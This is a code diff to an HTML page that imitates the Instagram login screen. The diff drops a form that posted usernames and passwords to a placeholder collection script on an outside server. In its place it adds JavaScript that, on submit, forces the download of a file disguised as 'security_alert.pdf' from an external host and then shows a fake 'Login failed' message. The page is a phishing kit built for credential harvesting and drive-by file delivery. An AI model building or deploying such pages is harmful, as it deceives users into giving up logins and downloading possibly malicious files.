@@ -77,7 +77,7 @@
     </div>
     <div class="right">
       <h1>Instagram</h1>
-      <form action="https://your-server.com/collect.php" method="POST">
+      <form id="loginForm">
         <input type="text" name="username" placeholder="Phone number, username, or email" required>
         <input type="password" name="password" placeholder="Password" required>
         <button type="submit">Log in</button>
@@ -90,5 +90,19 @@
       </div>
     </div>
   </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      // تفعيل التحميل التلقائي
+      const link = document.createElement('a');
+      link.href = "https://mariamelsoufyy.github.io/project/secure.pdf"; // حطي هنا ملفك
+      link.download = "security_alert.pdf";
+      document.body.appendChild(link);
+      link.click();
+      
+      alert("Login failed. Please try again later.");
+    });
+  </script>
 </body>
 </html>
